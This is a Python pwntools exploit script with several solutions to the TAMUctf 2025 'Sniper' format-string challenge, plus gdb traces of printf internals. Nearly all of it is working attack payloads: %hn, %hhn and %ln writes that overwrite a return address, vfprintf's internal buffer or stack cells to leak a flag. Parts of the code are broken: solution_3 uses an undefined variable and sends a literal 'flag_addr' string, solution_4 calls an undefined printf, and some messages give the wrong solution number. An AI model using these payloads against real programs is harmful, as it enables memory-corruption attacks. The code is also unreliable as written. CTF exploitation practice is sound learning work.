#!/usr/bin/env python3
#RazviOverflow

"""
Advanced format string vulnerabilities. Printf internals.
Solutions to "Sniper" challenge from TAMUctf 2025.
"""

from pwn import *

context.log_level = "debug"
context.binary = binary = ELF("./sniper_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)


# b *(vuln+98) # Break on vulnerable printf
# b *(printf+166) # Break after vfprintf call
# b *(printf++189) # Break on printf's ret

gdbscript="""
b *main
b *(vuln+98)
b *(printf+161)
b *(printf+166)
info b

ignore 3 1
ignore 4 1
"""


def solution_1(p: pwnlib.tubes.process.process):
    """
    Official solution as posted by TAMU team: https://github.com/tamuctf/tamuctf-2025/tree/main/pwn/sniper
    Maximum bytes -> 48 -> 6 * 8 -> 6 memory cells
    User inputs starts at 6th position
    """
    print("[+] Launching solution 2 -> abusing the fmt string without positional arguments [+]")
    leak = int(p.recv().strip(), 16)

    # Internal pointer        1 2 3 4 5 6 7 8 9     10 11  
    payload =               b"%c%c%c%c%c%c%c%c%2562c%hn%sAAAAA" + p64(leak+42) + p64(0) # leak + 42 is 2 bytes into the 11th position
    # Memory cells written    1       2       3       4           5              6
    # Printf position         6       7       8       9           10             11
    p.sendline(payload)
    p.interactive()


def solution_2(p: pwnlib.tubes.process.process):
    print("[+] Launching solution 2 -> overwriting vulnerable printf return address [+]")
    """
    Payload starts at position 6.
    There is a 0 memory cell at leak + 112, or leak + 14 positions. That is, position 20.

    Vulnerable printf returns to vuln+103 (offset e2)
    @ret address of vulenrable printf is at $(leaked buffer) - 8
    We can basically overwrite and make it return to vuln+86 again (offset d1)

    Write 0x0a0a0000 there. That is, write 0a0a at leak + 112 + 3 (3 bytes further, little endian)
    %2570c%8$n%8$s p64(leak + 112 + 3)
    """
    leak = int(p.recv().strip(), 16)
    payload =   b"%209c%11"         # pos 6 -> Overwrites the return address of vulnerable printf()
    payload +=  b"$hhn%236"         # pos 7
    payload +=  b"1c%10$hn"         # pos 8 -> Writes into the 20th stack position (initially a 0)
    payload +=  b"%20$sBBB"         # pos 9 -> Dereferences the 20th stack position (now 0xa0a00000) as a string
    payload +=  p64(leak + 112 + 2) # pos 10
    payload +=  p64(leak-8)         # pos 11
    p.sendline(payload)
    p.interactive()

def solution_3(p: pwnlib.tubes.process.process):
    print("[+] Launching solution 3 -> overwriting vfprintf internal buffer [+]")
    """
    pwndbg> search RAZVIAAA
    Searching for byte: b'RAZVIAAA'
    [stack]         0x7ffc6ea243d0 'RAZVIAAA'
    [stack]         0x7ffc6ea27538 'RAZVIAAA\n'
    pwndbg> dist 0x7ffc6ea27520 0x7ffc6ea243d0
    0x7ffc6ea27520->0x7ffc6ea243d0 is -0x3150 bytes (-0x62a words)

    """
    flag_addr = p64(0x0a0a0000)
    leak = int(p.recv().strip(), 16)
    
    #internal_buffer = leak-0x3150
    payload =   b"%10c%8$h"              # pos 6
    payload +=  b"hn%9$sAA"              # pos 7
    payload +=  p64(internal_buffer+3)   # pos 8
    payload +=  b"flag_addr"              # pos 9

    # Alternative solution
    # internal_buffer = leak-0x3b90
    # payload =   b"%2570c%8"              # pos 6
    # payload +=  b"$hn%9$sA"              # pos 7
    # payload +=  p64(internal_buffer+2)   # pos 8
    # payload +=  p64(0x0)                 # pos 9

    print(payload)
    p.sendline(payload)
    p.interactive()

def solution_4(p: pwnlib.tubes.process.process):
    printf("[+] Launching solution 4 -> sending all the bytes over the network [+]")
    """
    This solution relies on the fact that (luckily) on the 14th position there is a pointer to the 18th position on 
    the stack. This way, %ln dereferences the address at the 14th position, pointing to the 18th, writes 0xa0a0000 
    and then %18$s dereferences that address printing it as a string.
    """
    leak = int(p.recv().strip(), 16)
    # Internal pointer        1          2 3 4 5 6 7 8 9 1011121314 15
    payload =               b"%168427508c%c%c%c%c%c%c%c%c%c%c%c%c%ln%18$s"
    # Memory cells written    1       2       3       4       5        6
    # Printf position         6       7       8       9       10       11
    p.sendline(payload)
    p.interactive()

def initial_failed_solution(p: pwnlib.tubes.process.process):
    print("[+] Launching solution 4 -> sending all the bytes over the network [+]")
    """
    This was my initial approach. It fails because printf internally copies the values of the arguments to an 
    internal buffer as soon as it encounters a positional argument. That's why it prints a 0x0 (null) even though 
    the stack seems to contain the correct values.

    Before vfprintf call: (buffer is at @0x7ffcb5f41be0)
    1c:00e0│ rsi     0x7ffcb5f41be0 ◂— '%2570c%9$hn%8$X.'
    1d:00e8│-038     0x7ffcb5f41be8 ◂— '$hn%8$X.'
    1e:00f0│-030     0x7ffcb5f41bf0 ◂— 0
    1f:00f8│-028     0x7ffcb5f41bf8 —▸ 0x7ffcb5f41bf2 ◂— 0x1bf2000000000000

    After vfprintf call:
    1c:00e0│-040 0x7ffcb5f41be0 ◂— '%2570c%9$hn%8$X.'
    1d:00e8│-038 0x7ffcb5f41be8 ◂— '$hn%8$X.'
    1e:00f0│-030 0x7ffcb5f41bf0 —▸ 0xa0a0000 ◂— 'gigem{razvioverflow_f4k3-fl46}\n' <-- Overwrite with %hn seems correct
    1f:00f8│-028 0x7ffcb5f41bf8 —▸ 0x7ffcb5f41bf2 ◂— 0x1bf2000000000a0a /* '\n\n' */

    Yet it prints:
    [...] xd00.
    """
    leak = int(p.recv().strip(), 16)
    
    payload = b"%2570c%9"       # pos 6
    payload += b"$hn%8$X."      # pos 7
    payload += p64(0x0)         # pos 8
    payload += p64(leak+18)     # pos 9


    """
    Testing to see duplicated (but irrelevant) buffer
    pwndbg> search RAZVIAAA
    Searching for byte: b'RAZVIAAA'
    [stack]         0x7ffde14e2a70 'RAZVIAAARAZVIBBBRAZVICCCRAZVIDDD\n'
    [stack]         0x7ffde14e5110 'RAZVIAAARAZVIBBBRAZVICCCRAZVIDDD\n'
    pwndbg> dist 0x7ffde14e5110 0x7ffde14e2a70
    0x7ffde14e5110->0x7ffde14e2a70 is -0x26a0 bytes (-0x4d4 words)
    
    Now, enabling positional arguments:
    pwndbg> search RAZVIAAA
    Searching for byte: b'RAZVIAAA'
    [stack]         0x7ffdab2ee200 'RAZVIAAA' <------------ vfprintf internal buffer copy
    [stack]         0x7ffdab2eece0 'RAZVIAAARAZVIBBBRAZVICCCRAZVIDDD41414149565A415244444449565A4152\n'
    [stack]         0x7ffdab2f1380 'RAZVIAAARAZVIBBBRAZVICCCRAZVIDDD%6$lX%9$lX\n'
    pwndbg> search RAZVIDDD
    Searching for byte: b'RAZVIDDD'
    [stack]         0x7ffdab2edd10 'RAZVIDDD '
    [stack]         0x7ffdab2ee230 'RAZVIDDD' <------------ vfprintf internal buffer copy
    [stack]         0x7ffdab2eecf8 'RAZVIDDD41414149565A415244444449565A4152\n'
    [stack]         0x7ffdab2f1398 'RAZVIDDD%6$lX%9$lX\n'
    pwndbg> search RAZVIBBB
    Searching for byte: b'RAZVIBBB'
    [stack]         0x7ffdab2eece8 'RAZVIBBBRAZVICCCRAZVIDDD41414149565A415244444449565A4152\n'
    [stack]         0x7ffdab2f1388 'RAZVIBBBRAZVICCCRAZVIDDD%6$lX%9$lX\n'
    pwndbg> search RAZVICCC
    Searching for byte: b'RAZVICCC'
    [stack]         0x7ffdab2eecf0 'RAZVICCCRAZVIDDD41414149565A415244444449565A4152\n'
    [stack]         0x7ffdab2f1390 'RAZVICCCRAZVIDDD%6$lX%9$lX\n'
    pwndbg> dist 0x7ffdab2f1380 0x7ffdab2ee200
    0x7ffdab2f1380->0x7ffdab2ee200 is -0x3180 bytes (-0x630 words)
    pwndbg> dist 0x7ffdab2f1380 0x7ffdab2ee230
    0x7ffdab2f1380->0x7ffdab2ee230 is -0x3150 bytes (-0x62a words)

    """
    payload = b"RAZVIAAA"
    payload += b"RAZVIBBB"
    payload += b"RAZVICCC"
    payload += b"RAZVIDDD"
    payload += b"%6$lX%9$lX"
    p.sendline(payload)
    p.interactive()

"""
printf_internal_offset = 6
flag_addr = 0x0a0a0000
fgets reads 0x30 (48) bytes
"""
def main():
    if args.GDB or args.DBG:
        p = gdb.debug(binary.path, gdbscript=gdbscript)
    else:
        p = process()
    
    #pause()

    solution = int(input("Choose your solution: 1, 2, 3, 4 or 9: "))

    match solution:
        case 1:
            solution_1(p)
        case 2:
            solution_2(p)
        case 3:
            solution_3(p)
        case 4:
            solution_4(p)
        case 9:
            initial_failed_solution(p)
        case _:
            print("[+] Wrong solution number! Aborting [+]")

if __name__ == "__main__":
    main()